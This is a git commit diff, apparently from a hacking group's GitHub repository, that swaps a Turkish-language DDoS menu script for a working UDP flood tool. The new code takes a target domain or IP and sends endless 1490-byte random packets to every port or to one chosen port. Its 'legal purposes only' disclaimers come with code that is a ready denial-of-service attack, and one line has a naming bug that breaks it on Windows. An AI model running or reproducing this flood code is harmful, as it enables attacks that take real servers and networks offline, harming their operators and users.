114217346735a913fcaa81df7b1ca27aa221a22a
İNTİKAM21 CYBER <167871296+Intikam21kurucu@users.noreply.github.com>
2024-05-05 13:31:51 +0300

    Update DDOS.py

--- DDOS.py
+++ DDOS.py
@@ -1,62 +1,139 @@
+from   platform import system
+from   tqdm.auto import tqdm
 import os
-from pyfiglet import Figlet
-f = Figlet(font='slant')
-print(f.renderText('İNTİKAM21 CYBER TEAM'))
+import time
+import random
+import socket
+import pyfiglet
 
-print("                ")
 
-print("""
-    [+]Tool Name:DDOS
-    [+]Creator:ARES
-    [+]Team:ARES
-    [+]Github:https://github.com/ARESCYBERTEAM
-    [+]Version: V2.84""")
+# Version.
+version = "1.2"
 
-E = '\033[0m'
-H = '\033[95m'
 
-def exit():
-	os.system("clear")
-	os.system("exit")
-print("     ")
+# Platform info
+uname=system()
 
-tip = input('ARES>DDOS>[')
+if uname == "Windows":
+    cmd_clear_clear = 'cls'
+else:
+    cmd_clear = 'clear'
 
-print("DDOS İÇİN 1'E ÇÎKMAK İÇİN 2'YE BASÎNÎZ")
+os.system(cmd_clear)
 
-tip = input(E+'ARES»DDOS»'+H)
 
-if tip == "2":
-	exit()
+# Socket
+sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
 
-if tip == "1":	 
-	print("DDOS TOOLUNA GİRMEK İSTEDİĞİNE EMİN MİSİN?")
-	print("KLAVUZU GÖRMEK İÇİN 4'E TIKLA")
-	f = input("")
 
-	print("başlatacağız ama yapmak istediğine emin misin")
-	print("başlatmak istediğine emin misin?")
-	k = input("eminim veya değilim yaz : ")
-if tip == "3":
-	
-	 print(f.renderText('DDOS TOOLUNA HOSGELDIN'))
-	 print("Lütfen ddos atacağın ip'yi veya siteyi gir :")
-	 ip = input("  ")
-	 os.system("ping "+ip)
-	 
-if f == "4":
-	 print("""
-	FSM CYBER TEAMÎN HİÇBİR SORUMLULUĞU YOKTUR EĞLENCE VE TEST AMAÇLI YAPILMIŞTIR
-	EĞER DDOS TOOLU İLE BİR SİSTEM ÇÖKERTİLİRSE BİZİM HİÇBİR SORUMLULUĞUMUZ YOKTUR
-		
-	""")
-	 
-	 
-if k == "eminim":
-	print("başlatmak için 3'e bas")
-	
-	
-	
-if k == "değilim":
-	print(" o zaman görüşürüz.... ")
-	exit()
+# RDDoS_Tool
+while True:
+    print("                        Author:İntikam21 Cyber \033[91 Team\033[0m")
+    print("GitHub: https://github.com/Intikam21kurucu")
+    print('                   For legal purposes only')
+    print("\033[92;1m")
+    print("1. Website Domain\n2. IP Address\n3. About\n4. Exit")
+    print('\033[0m')
+
+    # Input.
+    opt = str(input("\n> "))
+
+    # Selection.
+    if opt == '1':
+        domain = str(input("Domain:"))
+        ip = socket.gethostbyname(domain)
+        break
+
+    elif opt == '2':
+        ip = str(input("IP Address: "))
+        break
+
+    elif opt == '3':
+        print("\n\033[101mEasy.       .سهل\033[0m  \033[101m       \033[0m  \033[101m        \033[0m \033[101m       \033[0m \033[0m                \033[92m_____\033[0m")
+        print("                  \033[101m   \033[0m  \033[101m   \033[0m \033[101m   \033[0m      \033[101m   \033[0m  \033[101m   \033[0m\033[0m             \033[92m.-'     '-.\033[0m")
+        print("\033[101mOpen.      .افتح\033[0m  \033[101m       \033[0m  \033[101m      \033[0m   \033[101m   \033[0m  \033[101m   \033[0m           \033[92m.'\033[91m____\033[0m secure\033[92m'.\033[0m")
+        print("                  \033[101m   \033[0m \033[101m   \033[0m  \033[101m   \033[0m      \033[101m   \033[0m  \033[101m   \033[0m          \033[92m/  \033[91m|  _ \\\033[0m  \033[93m__\033[0m   \033[92m\\\033[0m")
+        print("\033[101mSecure.    .يؤمن\033[0m  \033[101m   \033[0m  \033[101m   \033[0m \033[101m        \033[0m \033[101m       \033[0m          \033[92m;\033[0m r \033[91m| |_) /\033[0m\033[93m/ o\\\033[0m t \033[92m;\033[0m")
+        print("                                                     \033[92m|\033[0m e \033[91m|  _ <\033[0m \033[93m\\__/\033[0m e \033[92m|\033[0m")
+        print("RedDDoS Tool is an open source tool for              \033[92m;\033[0m d \033[91m|_| \\ \\\033[0m \033[93m<|\033[0m  a \033[92m;\033[0m")
+        print("penetration. You can test networks/servers/any        \033[92m\\       \033[91m\\/\033[0m \033[93m<|\033[0m  m\033[92m/\033[0m")
+        print("other devices with it.                                 \033[92m'.\033[0m member \033[93m<|\033[0m \033[92m.'\033[0m")
+        print("                                                         \033[92m'-._____.-'\033[0m")
+        print("Author of the program is not responsible for")
+        print("it's usage, everybody MUST use it ONLY in         member-id: 'rst-00000002'")
+        print("legit cases.")
+        print("\nFor more information visit project's site.")
+
+        goon = input("\n\n\n\n\n\n\nPress Enter to continue.")
+        os.system(cmd_clear)
+
+    elif opt == '4':
+        exit()
+
+    else:
+        print('\033[91mInvaild Choice!\033[0m')
+        time.sleep(2)
+        os.system(cmd_clear)
+
+# Port selection.
+port_mode = False # If 'False' all ports will be use, if 'True' - certain.
+port = 2
+
+while 1:
+    port_bool = str(input("Certain port? [y/n]: "))
+
+    if (port_bool == "y") or (port_bool == "Y"):
+        port_mode = True
+        port = int(input("Port: "))
+        break
+
+    elif (port_bool == "n") or (port_bool == "N"):
+        break
+
+    else:
+        print('\033[91mInvaild Choice!\033[0m')
+        time.sleep(2)
+
+# Starting working.
+os.system(cmd_clear)
+print('\033[36;2mINITIALIZING....')
+time.sleep(1)
+print('STARTING...')
+time.sleep(4)
+
+sent = 0
+
+if port_mode == False:  # All ports.
+    try:
+        while True:
+            if port == 65534:
+                port = 1
+
+            elif port == 1900:
+                port = 1901
+
+            sock.sendto(bytes, (ip, port))
+            sent += 1
+            port += 1
+            print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port))
+    except:
+        print('\n\033[31;1mExited\033[0m')
+
+elif port_mode == True: # Certain port.
+    if port < 2:
+        port = 2
+
+    elif port == 65534:
+        port = 2
+
+    elif port == 1900:
+        port = 1901
+
+    try:
+        while True:
+            sock.sendto(bytes, (ip, port))
+            sent += 1
+            print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port))      
+    except:
+        print('\n\033[31;1mExited\033[0m')	
